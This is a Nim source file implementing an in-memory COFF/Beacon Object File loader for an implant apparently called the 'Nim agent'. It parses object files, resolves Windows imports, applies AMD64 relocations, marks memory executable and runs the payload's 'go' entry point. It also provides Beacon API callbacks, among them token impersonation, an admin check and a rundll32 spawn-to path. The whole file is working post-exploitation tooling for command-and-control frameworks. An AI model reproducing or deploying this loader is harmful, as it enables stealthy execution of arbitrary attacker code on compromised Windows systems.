## COFF/BOF executor for the Nim agent — Windows AMD64 only.
## Ported from agents/agent-go/bof_windows.go.

when defined(windows):
  import winim/lean
  import std/[strutils, tables]

  # ── Types ─────────────────────────────────────────────────────────────────────

  type SecInfo = object
    mem:  pointer
    size: uint32
    char: uint32   # IMAGE_SCN characteristics

  ## DataParser / FormatP layout — must match beacon.h struct datap (x64 = 24 bytes)
  type DataParser {.packed.} = object
    original: uint   # 8 bytes (pointer)
    buffer:   uint   # 8 bytes (pointer)
    length:   int32  # 4 bytes
    size:     int32  # 4 bytes

  type SymRec = object
    name:   string
    secNum: int16
    value:  uint32

  # ── COFF relocation type constants ────────────────────────────────────────────

  const
    IMAGE_REL_AMD64_ADDR64   = 0x0001'u16
    IMAGE_REL_AMD64_ADDR32NB = 0x0003'u16
    IMAGE_REL_AMD64_REL32    = 0x0004'u16
    IMAGE_REL_AMD64_REL32_1  = 0x0005'u16
    IMAGE_REL_AMD64_REL32_2  = 0x0006'u16
    IMAGE_REL_AMD64_REL32_3  = 0x0007'u16
    IMAGE_REL_AMD64_REL32_4  = 0x0008'u16
    IMAGE_REL_AMD64_REL32_5  = 0x0009'u16

  # ── Global BOF state (reset on each run; BOFs execute serially) ───────────────

  var gBofOutput: string
  var gBofAllocs: seq[pointer]
  var gFmtBufs   = initTable[uint, string]()

  # ── Little-endian byte readers ────────────────────────────────────────────────

  proc u16le(d: seq[byte]; o: int): uint16 {.inline.} =
    uint16(d[o]) or (uint16(d[o+1]) shl 8)

  proc u32le(d: seq[byte]; o: int): uint32 {.inline.} =
    uint32(d[o]) or (uint32(d[o+1]) shl 8) or
    (uint32(d[o+2]) shl 16) or (uint32(d[o+3]) shl 24)

  # ── Bswap32 (BOF wire format is big-endian for data args) ────────────────────

  proc bswap32(v: int32): int32 {.inline.} =
    let u = cast[uint32](v)
    cast[int32]((u shr 24) or ((u shr 8) and 0xFF00'u32) or
                ((u shl 8) and 0x00FF0000'u32) or (u shl 24))

  # ── Hex formatter (unsigned, no leading zeros) ────────────────────────────────

  proc hexFmt(v: uint64; upper: bool): string =
    if v == 0: return "0"
    let ch = if upper: "0123456789ABCDEF" else: "0123456789abcdef"
    var vv = v
    while vv != 0:
      result = ch[int(vv and 0xF)] & result
      vv = vv shr 4

  # ── C-string pointer → Nim string ────────────────────────────────────────────

  proc ptrToStr(p: pointer): string =
    if p == nil: return ""
    $cast[cstring](p)

  # ── Minimal printf formatter ──────────────────────────────────────────────────

  proc bofSprintf(fmt: string; args: openArray[uint]): string =
    var ai = 0
    var i  = 0
    while i < fmt.len:
      if fmt[i] != '%':
        result.add(fmt[i]); inc i; continue
      inc i
      if i >= fmt.len: result.add('%'); break
      # skip flags / width / precision
      while i < fmt.len and fmt[i] in {'-','+','#','0',' ','1','2','3','4','5','6','7','8','9','.'}:
        inc i
      if i < fmt.len and fmt[i] == '*': inc ai; inc i
      # skip length modifiers
      while i < fmt.len and fmt[i] in {'l','h','I','z','L','j','t'}: inc i
      if i >= fmt.len: break
      let verb = fmt[i]; inc i
      let a = if ai < args.len: args[ai] else: 0'u
      inc ai
      case verb
      of 'd','i': result.add($cast[int32](a))
      of 'u':     result.add($cast[uint32](a))
      of 'x':     result.add(hexFmt(a.uint64, false))
      of 'X':     result.add(hexFmt(a.uint64, true))
      of 'p':     result.add("0x" & hexFmt(a.uint64, false))
      of 's':     result.add(ptrToStr(cast[pointer](a)))
      of 'c':     result.add(char(a and 0xFF'u))
      of '%':     result.add('%'); dec ai
      else:       result.add('%'); result.add(verb); dec ai

  # ── BeaconAPI callbacks — all {.cdecl.} to match C calling convention ─────────

  proc beaconDataParse(parserPtr, buf: pointer; size: int32) {.cdecl.} =
    let p = cast[ptr DataParser](parserPtr)
    p.original = cast[uint](buf)
    p.buffer   = cast[uint](buf)
    p.length   = size
    p.size     = size

  proc beaconDataInt(parserPtr: pointer): int32 {.cdecl.} =
    let p = cast[ptr DataParser](parserPtr)
    if p.length < 4: return 0
    let v = cast[ptr int32](cast[pointer](p.buffer))[]
    p.buffer += 4; p.length -= 4
    bswap32(v)

  proc beaconDataShort(parserPtr: pointer): uint16 {.cdecl.} =
    let p = cast[ptr DataParser](parserPtr)
    if p.length < 2: return 0
    let v = cast[ptr uint16](cast[pointer](p.buffer))[]
    p.buffer += 2; p.length -= 2
    (v shr 8) or (v shl 8)

  proc beaconDataLength(parserPtr: pointer): int32 {.cdecl.} =
    cast[ptr DataParser](parserPtr).length

  proc beaconDataExtract(parserPtr: pointer; sizePtr: ptr int32): pointer {.cdecl.} =
    let p = cast[ptr DataParser](parserPtr)
    if p.length < 4: return nil
    let ln = bswap32(cast[ptr int32](cast[pointer](p.buffer))[])
    p.buffer += 4; p.length -= 4
    if ln < 0 or ln > p.length: return nil
    let res = cast[pointer](p.buffer)
    p.buffer += uint(ln); p.length -= ln
    if sizePtr != nil: sizePtr[] = ln
    res

  proc beaconOutput(typ: int32; data: pointer; length: int32) {.cdecl.} =
    if data != nil and length > 0:
      let old = gBofOutput.len
      gBofOutput.setLen(old + length.int)
      copyMem(addr gBofOutput[old], data, length.int)

  proc beaconPrintf(typ: int32; fmt: cstring; a0, a1, a2, a3: uint) {.cdecl.} =
    if fmt != nil:
      gBofOutput.add(bofSprintf($fmt, [a0, a1, a2, a3]))

  proc beaconFormatAlloc(fpPtr: pointer; maxsz: int32) {.cdecl.} =
    let key = cast[uint](fpPtr)
    gFmtBufs[key] = ""
    let fp = cast[ptr DataParser](fpPtr)
    fp.size = maxsz; fp.length = 0

  proc beaconFormatReset(fpPtr: pointer) {.cdecl.} =
    let key = cast[uint](fpPtr)
    if key in gFmtBufs: gFmtBufs[key] = ""
    cast[ptr DataParser](fpPtr).length = 0

  proc beaconFormatFree(fpPtr: pointer) {.cdecl.} =
    gFmtBufs.del(cast[uint](fpPtr))

  proc beaconFormatAppend(fpPtr, text: pointer; length: int32) {.cdecl.} =
    if text == nil or length <= 0: return
    let key = cast[uint](fpPtr)
    if key in gFmtBufs:
      let old = gFmtBufs[key].len
      gFmtBufs[key].setLen(old + length.int)
      copyMem(addr gFmtBufs[key][old], text, length.int)
    cast[ptr DataParser](fpPtr).length += length

  proc beaconFormatPrintf(fpPtr: pointer; fmt: cstring; a0, a1, a2, a3: uint) {.cdecl.} =
    if fmt == nil: return
    let s   = bofSprintf($fmt, [a0, a1, a2, a3])
    let key = cast[uint](fpPtr)
    if key in gFmtBufs: gFmtBufs[key].add(s)
    cast[ptr DataParser](fpPtr).length += int32(s.len)

  proc beaconFormatToStr(fpPtr: pointer; sizePtr: ptr int32): pointer {.cdecl.} =
    let key     = cast[uint](fpPtr)
    let content = if key in gFmtBufs: gFmtBufs[key] else: ""
    let n       = content.len
    let mem = VirtualAlloc(nil, SIZE_T(n + 1), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if mem == nil: return nil
    gBofAllocs.add(mem)
    if n > 0: copyMem(mem, unsafeAddr content[0], n)
    if sizePtr != nil: sizePtr[] = int32(n)
    cast[ptr DataParser](fpPtr).original = cast[uint](mem)
    mem

  proc beaconFormatInt(fpPtr: pointer; value: int32) {.cdecl.} =
    let be  = bswap32(value)
    let b   = cast[array[4, char]](be)
    let key = cast[uint](fpPtr)
    if key in gFmtBufs:
      for ch in b: gFmtBufs[key].add(ch)
    cast[ptr DataParser](fpPtr).length += 4

  proc beaconIsAdmin(): int32 {.cdecl.} =
    var hToken: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken) == 0:
      return 0
    var elev: DWORD = 0; var retLen: DWORD = 0
    # TokenElevation = 20 in TOKEN_INFORMATION_CLASS
    discard GetTokenInformation(hToken, cast[TOKEN_INFORMATION_CLASS](20),
                                addr elev, DWORD(sizeof(DWORD)), addr retLen)
    discard CloseHandle(hToken)
    int32(elev)

  proc beaconGetSpawnTo(x86: int32; bufPtr: pointer; length: int32) {.cdecl.} =
    let s = if x86 != 0: "C:\\Windows\\SysWOW64\\rundll32.exe"
            else: "C:\\Windows\\System32\\rundll32.exe"
    let n = min(s.len, int(length) - 1)
    if n > 0 and bufPtr != nil:
      copyMem(bufPtr, unsafeAddr s[0], n)
    cast[ptr UncheckedArray[byte]](bufPtr)[n] = 0

  proc bofToWideChar(srcPtr, dstPtr: pointer; maxChars: int32): int32 {.cdecl.} =
    if srcPtr == nil: return 0
    # Call MultiByteToWideChar via GetProcAddress to avoid winim LPCCH/UINT type friction.
    type MBToWCFn = proc(cp, flags: DWORD; src: pointer; cbSrc: int32;
                         dst: pointer; cch: int32): int32 {.stdcall.}
    let hK32 = GetModuleHandleA("kernel32.dll")
    if hK32 == 0: return 0
    let fn = cast[MBToWCFn](GetProcAddress(hK32, "MultiByteToWideChar"))
    if fn == nil: return 0
    fn(DWORD(65001), DWORD(0), srcPtr, int32(-1), dstPtr, maxChars)

  # Stubs — no-op placeholders for injection/token/sleep APIs
  proc beaconInjectProcess(a,b,c,d,e,f,g: uint): uint {.cdecl.} = 0
  proc beaconInjectTmp(a,b,c,d,e,f: uint): uint {.cdecl.} = 0
  proc beaconCleanupProcess(a: uint) {.cdecl.} = discard
  proc beaconSpawnTmp(a,b,c,d: uint): uint {.cdecl.} = 0

  proc beaconRevertToken(): int32 {.cdecl.} =
    RevertToSelf().int32

  proc beaconUseToken(token: HANDLE): int32 {.cdecl.} =
    ImpersonateLoggedOnUser(token).int32

  proc beaconSetSleep(ms, jitter: int32) {.cdecl.} = discard

  # ── Beacon API name → function-pointer table ──────────────────────────────────

  type BeaconEntry = tuple[name: string; p: pointer]

  # Initialised once at module load; proc addresses are stable runtime constants.
  let gBeaconApi: seq[BeaconEntry] = @[
    ("BeaconDataParse",              cast[pointer](beaconDataParse)),
    ("BeaconDataInt",                cast[pointer](beaconDataInt)),
    ("BeaconDataShort",              cast[pointer](beaconDataShort)),
    ("BeaconDataLength",             cast[pointer](beaconDataLength)),
    ("BeaconDataExtract",            cast[pointer](beaconDataExtract)),
    ("BeaconOutput",                 cast[pointer](beaconOutput)),
    ("BeaconPrintf",                 cast[pointer](beaconPrintf)),
    ("BeaconFormatAlloc",            cast[pointer](beaconFormatAlloc)),
    ("BeaconFormatReset",            cast[pointer](beaconFormatReset)),
    ("BeaconFormatFree",             cast[pointer](beaconFormatFree)),
    ("BeaconFormatAppend",           cast[pointer](beaconFormatAppend)),
    ("BeaconFormatPrintf",           cast[pointer](beaconFormatPrintf)),
    ("BeaconFormatToString",         cast[pointer](beaconFormatToStr)),
    ("BeaconFormatInt",              cast[pointer](beaconFormatInt)),
    ("BeaconIsAdmin",                cast[pointer](beaconIsAdmin)),
    ("BeaconGetSpawnTo",             cast[pointer](beaconGetSpawnTo)),
    ("toWideChar",                   cast[pointer](bofToWideChar)),
    ("BeaconInjectProcess",          cast[pointer](beaconInjectProcess)),
    ("BeaconInjectTemporaryProcess", cast[pointer](beaconInjectTmp)),
    ("BeaconCleanupProcess",         cast[pointer](beaconCleanupProcess)),
    ("BeaconSpawnTemporaryProcess",  cast[pointer](beaconSpawnTmp)),
    ("BeaconRevertToken",            cast[pointer](beaconRevertToken)),
    ("BeaconUseToken",               cast[pointer](beaconUseToken)),
    ("BeaconSetSleep",               cast[pointer](beaconSetSleep)),
  ]

  proc beaconApiLookup(name: string): pointer =
    for (n, p) in gBeaconApi:
      if n == name: return p
    nil

  # ── External symbol resolution ────────────────────────────────────────────────

  proc resolveExternal(name: string): pointer =
    ## Returns an 8-byte IAT thunk for __imp_ symbols; nil for anything else.
    if not name.startsWith("__imp_"): return nil
    let impName = name[6..^1]

    # Allocate an 8-byte import-table thunk slot (holds the function pointer).
    let thunk = VirtualAlloc(nil, SIZE_T(8), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if thunk == nil: return nil
    gBofAllocs.add(thunk)

    var funcAddr: pointer = nil
    let dollarIdx = impName.find('$')
    if dollarIdx >= 0:
      # DLL$Function  →  LoadLibraryA + GetProcAddress
      let dllName  = impName[0..<dollarIdx].toLowerAscii() & ".dll"
      let funcName = impName[dollarIdx+1..^1]
      let hLib = LoadLibraryA(dllName.cstring)
      if hLib != 0:
        funcAddr = cast[pointer](GetProcAddress(hLib, funcName.cstring))
    else:
      # Beacon API name
      funcAddr = beaconApiLookup(impName)
      if funcAddr == nil:
        # Fallback: try ntdll then kernel32 for non-Beacon plain names
        let hNt = GetModuleHandleA("ntdll.dll")
        if hNt != 0:
          funcAddr = cast[pointer](GetProcAddress(hNt, impName.cstring))
      if funcAddr == nil:
        let hK32 = GetModuleHandleA("kernel32.dll")
        if hK32 != 0:
          funcAddr = cast[pointer](GetProcAddress(hK32, impName.cstring))

    cast[ptr pointer](thunk)[] = funcAddr
    thunk

  # ── Relocation application (AMD64) ───────────────────────────────────────────

  proc applyReloc(patchAddr, target: uint; typ: uint16) =
    case typ
    of IMAGE_REL_AMD64_ADDR64:
      cast[ptr uint64](cast[pointer](patchAddr))[] += uint64(target)

    of IMAGE_REL_AMD64_REL32, IMAGE_REL_AMD64_REL32_1, IMAGE_REL_AMD64_REL32_2,
       IMAGE_REL_AMD64_REL32_3, IMAGE_REL_AMD64_REL32_4, IMAGE_REL_AMD64_REL32_5:
      let n        = uint(typ - IMAGE_REL_AMD64_REL32)   # 0..5
      let existing = int64(cast[ptr int32](cast[pointer](patchAddr))[])
      let next     = int64(patchAddr) + 4 + int64(n)
      cast[ptr int32](cast[pointer](patchAddr))[] =
        int32(int64(target) + existing - next)

    of IMAGE_REL_AMD64_ADDR32NB:
      let existing = int64(cast[ptr int32](cast[pointer](patchAddr))[])
      cast[ptr int32](cast[pointer](patchAddr))[] = int32(int64(target) + existing)

    else: discard

  # ── Symbol name reader (inline or string-table) ───────────────────────────────

  proc readSymName(d: seq[byte]; symOff, strTabOff: int): string =
    if u32le(d, symOff) == 0:
      # Long name: first 4 bytes = 0, next 4 = offset into string table
      let strOff = int(u32le(d, symOff + 4))
      let absOff = strTabOff + strOff
      if absOff >= d.len: return ""
      var n = absOff
      while n < d.len and d[n] != 0: inc n
      for k in absOff..<n: result.add(char(d[k]))
    else:
      # Inline name: up to 8 bytes, null-terminated
      var n = symOff
      while n < symOff + 8 and n < d.len and d[n] != 0: inc n
      for k in symOff..<n: result.add(char(d[k]))

  # ── Public entry point ────────────────────────────────────────────────────────

  proc bofExec*(coffData: seq[byte]; packedArgs: seq[byte]): string =
    ## Load and execute a COFF BOF. Returns output text or an error string.

    # ── Reset per-run state ──────────────────────────────────────────────────
    gBofOutput = ""
    gFmtBufs.clear()
    gBofAllocs = @[]

    template cleanup() =
      for p in gBofAllocs:
        if p != nil: discard VirtualFree(p, 0, MEM_RELEASE)
      gBofAllocs = @[]
      gFmtBufs.clear()

    try:
      # ── Parse COFF file header ─────────────────────────────────────────────
      if coffData.len < 20:
        return "BOF error: COFF too small"

      let machine = u16le(coffData, 0)
      if machine != 0x8664'u16:
        return "BOF error: not AMD64 COFF (machine=0x" & hexFmt(machine.uint64, false) & ")"

      let numSections = int(u16le(coffData, 2))
      let symTabOff   = int(u32le(coffData, 8))
      let numSymbols  = int(u32le(coffData, 12))
      let optHdrSize  = int(u16le(coffData, 16))
      let secBase     = 20 + optHdrSize

      # ── Allocate sections (RW for now; perms applied after relocation) ─────
      var secs = newSeq[SecInfo](numSections)

      for i in 0..<numSections:
        let h = secBase + i * 40
        if h + 40 > coffData.len:
          cleanup(); return "BOF error: section header " & $i & " out of bounds"

        let virtSize  = u32le(coffData, h + 8)
        let rawSize   = u32le(coffData, h + 16)
        let rawOff    = u32le(coffData, h + 20)
        let sChar     = u32le(coffData, h + 36)

        let allocSize = if virtSize > rawSize: virtSize else: rawSize
        if allocSize == 0: continue

        let mem = VirtualAlloc(nil, SIZE_T(allocSize), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        if mem == nil:
          cleanup(); return "BOF error: VirtualAlloc section " & $i & " failed"
        gBofAllocs.add(mem)

        if rawSize > 0:
          if int(rawOff) + int(rawSize) > coffData.len:
            cleanup(); return "BOF error: section " & $i & " raw data OOB"
          copyMem(mem, unsafeAddr coffData[int(rawOff)], int(rawSize))

        secs[i] = SecInfo(mem: mem, size: allocSize, char: sChar)

      # ── Parse symbol table ─────────────────────────────────────────────────
      if symTabOff == 0 or numSymbols == 0:
        cleanup(); return "BOF error: no symbol table in COFF"

      let strTabOff = symTabOff + numSymbols * 18

      var symRecs  = newSeq[SymRec](numSymbols)
      var symAddrs = newSeq[uint](numSymbols)

      var si = 0
      while si < numSymbols:
        let off = symTabOff + si * 18
        if off + 18 > coffData.len: break

        let name   = readSymName(coffData, off, strTabOff)
        let value  = u32le(coffData, off + 8)
        let secNum = int16(u16le(coffData, off + 12))
        let aux    = int(coffData[off + 17])

        symRecs[si] = SymRec(name: name, secNum: secNum, value: value)

        if secNum > 0 and secNum.int <= numSections:
          let secMem = secs[secNum.int - 1].mem
          if secMem != nil:
            symAddrs[si] = cast[uint](secMem) + uint(value)

        si += 1 + aux

      # ── Resolve external symbols ───────────────────────────────────────────
      si = 0
      while si < numSymbols:
        let r = symRecs[si]
        if r.secNum == 0 and r.name.len > 0 and symAddrs[si] == 0:
          let thunk = resolveExternal(r.name)
          if thunk != nil:
            symAddrs[si] = cast[uint](thunk)
        let off = symTabOff + si * 18
        let aux = if off + 18 <= coffData.len: int(coffData[off + 17]) else: 0
        si += 1 + aux

      # ── Apply relocations ──────────────────────────────────────────────────
      for i in 0..<numSections:
        if secs[i].mem == nil: continue
        let h         = secBase + i * 40
        let numRelocs = int(u16le(coffData, h + 32))
        let relOff    = int(u32le(coffData, h + 24))

        for j in 0..<numRelocs:
          let rOff = relOff + j * 10
          if rOff + 10 > coffData.len: break

          let virtAddr  = u32le(coffData, rOff)
          let symIdx    = int(u32le(coffData, rOff + 4))
          let relocType = u16le(coffData, rOff + 8)

          if symIdx >= numSymbols: continue
          let target    = symAddrs[symIdx]
          let patchAddr = cast[uint](secs[i].mem) + uint(virtAddr)
          applyReloc(patchAddr, target, relocType)

      # ── Flip section permissions ───────────────────────────────────────────
      for i in 0..<numSections:
        if secs[i].mem == nil: continue
        let c     = secs[i].char
        let exec  = (c and 0x20000000'u32) != 0
        let write = (c and 0x80000000'u32) != 0
        let prot: DWORD =
          if exec and write:  PAGE_EXECUTE_READWRITE
          elif exec:          PAGE_EXECUTE_READ
          elif write:         PAGE_READWRITE
          else:               PAGE_READONLY
        var old: DWORD = 0
        discard VirtualProtect(secs[i].mem, SIZE_T(secs[i].size), prot, addr old)

      # ── Locate "go" entry symbol ───────────────────────────────────────────
      var entry: pointer = nil
      si = 0
      while si < numSymbols:
        let r = symRecs[si]
        if r.name == "go" and r.secNum > 0 and r.secNum.int <= numSections:
          let secMem = secs[r.secNum.int - 1].mem
          if secMem != nil:
            entry = cast[pointer](cast[uint](secMem) + uint(r.value))
            break
        let off = symTabOff + si * 18
        let aux = if off + 18 <= coffData.len: int(coffData[off + 17]) else: 0
        si += 1 + aux

      if entry == nil:
        cleanup(); return "BOF error: 'go' entry point not found in COFF"

      # ── Allocate stable args buffer ────────────────────────────────────────
      var argsPtr: pointer = nil
      var argsLen: int32   = 0
      if packedArgs.len > 0:
        let argsMem = VirtualAlloc(nil, SIZE_T(packedArgs.len),
                                   MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        if argsMem == nil:
          cleanup(); return "BOF error: VirtualAlloc args failed"
        gBofAllocs.add(argsMem)
        copyMem(argsMem, unsafeAddr packedArgs[0], packedArgs.len)
        argsPtr = argsMem
        argsLen = int32(packedArgs.len)

      # ── Execute BOF ────────────────────────────────────────────────────────
      type BofEntry = proc(args: pointer; len: int32) {.cdecl.}
      cast[BofEntry](entry)(argsPtr, argsLen)

      result = gBofOutput

    except CatchableError as e:
      result = "BOF error: " & e.msg

    cleanup()
